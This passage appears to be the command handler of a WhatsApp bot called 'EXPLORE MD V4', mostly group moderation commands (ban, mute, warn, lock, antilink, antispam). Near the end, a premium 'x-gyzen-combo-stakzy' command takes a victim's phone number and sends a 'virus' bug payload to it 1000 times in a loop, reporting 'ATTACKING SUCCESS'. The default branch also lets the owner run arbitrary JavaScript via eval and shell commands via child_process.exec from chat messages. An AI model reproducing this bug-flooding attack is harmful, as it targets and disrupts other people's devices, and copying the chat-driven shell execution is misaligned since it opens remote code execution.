        if (!bannedUsers.includes(participantJid)) {
            bannedUsers.push(participantJid);
            fs.writeFileSync('./system/banned.json', JSON.stringify(bannedUsers));
        }
        
        ReplyButton(`🚫 Banned *@${number}* permanently from the group.`, m.chat, {
            mentions: [participantJid]
        });
    } catch (error) {
        console.error('Ban error:', error);
        ReplyButton('Failed to ban user.');
    }
    break;
}

case 'mute': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number, duration = 60; // default 60 minutes
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
        // Check if duration is specified (e.g., !mute 30 @user)
        if (args[1] && !isNaN(args[1])) duration = parseInt(args[1]);
    } else {
        return ReplyButton('Usage: !mute [duration] @user');
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    // Add to muted list with expiration time
    const muteExpiration = Date.now() + (duration * 60000);
    mutedUsers[participantJid] = muteExpiration;
    fs.writeFileSync('./system/muted.json', JSON.stringify(mutedUsers));
    
    ReplyButton(`🔇 Muted *@${number}* for ${duration} minutes.`, m.chat, {
        mentions: [participantJid]
    });
    break;
}

case 'unmute': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton('Usage: !unmute @user');
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    // Remove from muted list
    if (mutedUsers[participantJid]) {
        delete mutedUsers[participantJid];
        fs.writeFileSync('./system/muted.json', JSON.stringify(mutedUsers));
        ReplyButton(`🔊 Unmuted *@${number}*.`, m.chat, {
            mentions: [participantJid]
        });
    } else {
        ReplyButton(`*@${number}* is not muted.`, m.chat, {
            mentions: [participantJid]
        });
    }
    break;
}

case 'warn': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number, reason = 'No reason provided';
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
        if (args[0]) reason = args.join(' ');
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
        if (args.length > 1) reason = args.slice(1).join(' ');
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
        if (args.length > 1) reason = args.slice(1).join(' ');
    } else {
        return ReplyButton('Usage: !warn @user [reason]');
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    // Initialize warnings if not exists
    if (!userWarnings[participantJid]) {
        userWarnings[participantJid] = [];
    }
    
    // Add warning with timestamp and reason
    userWarnings[participantJid].push({
        time: Date.now(),
        reason: reason,
        warnedBy: m.sender
    });
    
    fs.writeFileSync('./system/warnings.json', JSON.stringify(userWarnings));
    
    const warningCount = userWarnings[participantJid].length;
    ReplyButton(`⚠️ Warned *@${number}* (Warning ${warningCount}/3)\nReason: ${reason}`, m.chat, {
        mentions: [participantJid]
    });
    
    // Auto-ban after 3 warnings
    if (warningCount >= 3) {
        await client.groupParticipantsUpdate(m.chat, [participantJid], 'remove');
        ReplyButton(`🚫 *@${number}* has been banned after 3 warnings.`, m.chat, {
            mentions: [participantJid]
        });
    }
    break;
}

case 'unwarn': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton('Usage: !unwarn @user');
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    if (userWarnings[participantJid] && userWarnings[participantJid].length > 0) {
        userWarnings[participantJid].pop(); // Remove last warning
        fs.writeFileSync('./system/warnings.json', JSON.stringify(userWarnings));
        
        const warningCount = userWarnings[participantJid].length;
        ReplyButton(`✅ Removed last warning from *@${number}* (Now at ${warningCount}/3 warnings)`, m.chat, {
            mentions: [participantJid]
        });
    } else {
        ReplyButton(`*@${number}* has no warnings.`, m.chat, {
            mentions: [participantJid]
        });
    }
    break;
}

case 'warnings': {
    if (!m.isGroup) return ReplyButton(mess.group);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        // Show warnings for self if no user specified
        number = m.sender.split('@')[0];
    }
    
    const participantJid = number + '@s.whatsapp.net';
    
    if (!userWarnings[participantJid] || userWarnings[participantJid].length === 0) {
        ReplyButton(`*@${number}* has no warnings.`, m.chat, {
            mentions: [participantJid]
        });
    } else {
        const warnings = userWarnings[participantJid];
        let warningText = `⚠️ Warnings for *@${number}* (${warnings.length}/3):\n\n`;
        
        warnings.forEach((warn, index) => {
            const date = new Date(warn.time).toLocaleString();
            warningText += `${index + 1}. ${warn.reason} [${date}]\n`;
        });
        
        ReplyButton(warningText, m.chat, {
            mentions: [participantJid]
        });
    }
    break;
}

case 'lock': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    const setting = args[0]?.toLowerCase() || 'all';
    let lockText = '';
    
    try {
        if (setting === 'all' || setting === 'messages') {
            // Lock group (make invite only)
            await client.groupSettingUpdate(m.chat, 'announcement');
            lockText += '🔒 Group is now locked. Only admins can send messages.\n';
        }
        
        if (setting === 'all' || setting === 'info') {
            // Lock group info
            await client.groupSettingUpdate(m.chat, 'locked');
            lockText += '🔒 Group info is now locked.\n';
        }
        
        ReplyButton(lockText || 'Usage: !lock [all/messages/info]');
    } catch (error) {
        console.error('Lock error:', error);
        ReplyButton('Failed to lock group settings.');
    }
    break;
}

case 'unlock': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    const setting = args[0]?.toLowerCase() || 'all';
    let unlockText = '';
    
    try {
        if (setting === 'all' || setting === 'messages') {
            // Unlock group
            await client.groupSettingUpdate(m.chat, 'not_announcement');
            unlockText += '🔓 Group is now unlocked. Everyone can send messages.\n';
        }
        
        if (setting === 'all' || setting === 'info') {
            // Unlock group info
            await client.groupSettingUpdate(m.chat, 'unlocked');
            unlockText += '🔓 Group info is now unlocked.\n';
        }
        
        ReplyButton(unlockText || 'Usage: !unlock [all/messages/info]');
    } catch (error) {
        console.error('Unlock error:', error);
        ReplyButton('Failed to unlock group settings.');
    }
    break;
}

case 'antilink': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    const action = args[0]?.toLowerCase();
    
    if (action === 'on') {
        antiLinkGroups[m.chat] = true;
        ReplyButton('✅ Anti-link protection enabled. Links will be deleted automatically.');
    } else if (action === 'off') {
        antiLinkGroups[m.chat] = false;
        ReplyButton('❌ Anti-link protection disabled.');
    } else {
        const status = antiLinkGroups[m.chat] ? 'enabled' : 'disabled';
        ReplyButton(`Anti-link protection is currently ${status}. Use !antilink on/off`);
    }
    
    fs.writeFileSync('./system/antilink.json', JSON.stringify(antiLinkGroups));
    break;
}

case 'antispam': {
    if (!m.isGroup) return ReplyButton(mess.group);
    if (!isBotAdmins) return ReplyButton(mess.botAdmin);
    if (!isAdmins) return ReplyButton(mess.admin);
    
    const action = args[0]?.toLowerCase();
    
    if (action === 'on') {
        antiSpamGroups[m.chat] = true;
        ReplyButton('✅ Anti-spam protection enabled. Spammers will be muted automatically.');
    } else if (action === 'off') {
        antiSpamGroups[m.chat] = false;
        ReplyButton('❌ Anti-spam protection disabled.');
    } else {
        const status = antiSpamGroups[m.chat] ? 'enabled' : 'disabled';
        ReplyButton(`Anti-spam protection is currently ${status}. Use !antispam on/off`);
    }
    
    fs.writeFileSync('./system/antispam.json', JSON.stringify(antiSpamGroups));
    break;
}
// Command Bug

//=================================================//

break

case 'x-gyzen-combo-stakzy': {

  try {

    if (!isCreator && !isPremium) return ReplyButton(mess.premium);

    if (!q) return ReplyButton(example("628xxx or tag @user"))

    let mentionedJid;

    if (m.mentionedJid?.length > 0) {

        mentionedJid = m.mentionedJid[0];

    } else {

        let jidx = q.replace(/[^0-9]/g, "");

        if (jidx.startsWith('0')) return ReplyButton(example("62xxx"))

        mentionedJid = `${jidx}@s.whatsapp.net`;

        lockNum = `${jidx}`;

    }

    let target = mentionedJid;

    let lock = lockNum;

    let teks = `\`「 ATTACKING SUCCESS 」\`

    

𖥂 TARGET : *${lock}*

𖥂 VIRUS : *${command}*`

ReplyButton(teks)

////////// Sending Bugs //////////

for (let i = 0; i < 1000; i++) {

console.log(chalk.green(`© X-Gyzen-Combo-Stakzy : ${i}/1000

target : ${target}`));

await protocolbug1(client, target, false)

}

////////// Succes Bugs //////////

  } catch (err) {

    console.error(err);

    ReplyButton("Failed to send virus. Make sure the number is valid.");

}

}

break

case "dev":

case "devoloper":

case "owner":

case "xowner": {

  let namaown = `REDDRAGON DFS ϟ`

  let NoOwn = `27634988679`

  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({

    contactMessage: {

      displayName: namaown,

      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Phone\nX-WA-BIZ-DESCRIPTION:REDDRAGON DFS🐉\nX-WA-BIZ-NAME:[[ EXPLORE MD V4 ]]\nEND:VCARD`

    }

  }), {

    userJid: m.chat,

    quoted: lol

  })

  client.relayMessage(m.chat, contact.message, {

    messageId: contact.key.id

  })

}

break

case "tqto":

case "credits": {

let Menu = `┏━━⬣  Thanks To  DFS

┃ 🕊 REDDRAGON DFS </> Dev\`

┃ 🕊 EXPLORE MD V4

┗━━⬣  ⿻  ⌜ REDDRAGON DFS🐉 ⌟  ⿻

> WhatsApp Bot 2025 By REDDRAGON DFS

`

ReplyButton(Menu)

}

break;

default:

if (budy.startsWith('<')) {

if (!isCreator) return;

function Return(sul) {

sat = JSON.stringify(sul, null, 2)

bang = util.format(sat)

if (sat == undefined) {

bang = util.format(sul)}

return m.reply(bang)}

try {

m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))

} catch (e) {

m.reply(String(e))}}

if (budy.startsWith('>')) {

if (!isCreator) return;

try {

let evaled = await eval(budy.slice(2))

if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)

await m.reply(evaled)

} catch (err) {

await m.reply(String(err))

}

}

if (budy.startsWith('$')) {

if (!isCreator) return;

require("child_process").exec(budy.slice(2), (err, stdout) => {

if (err) return m.reply(`${err}`)

if (stdout) return m.reply(stdout)

})

}

}

} catch (err) {

console.log(require("util").format(err));

}

}

let file = require.resolve(__filename)

require('fs').watchFile(file, () => {

require('fs').unwatchFile(file)

console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')

delete require.cache[file]

require(file)

})
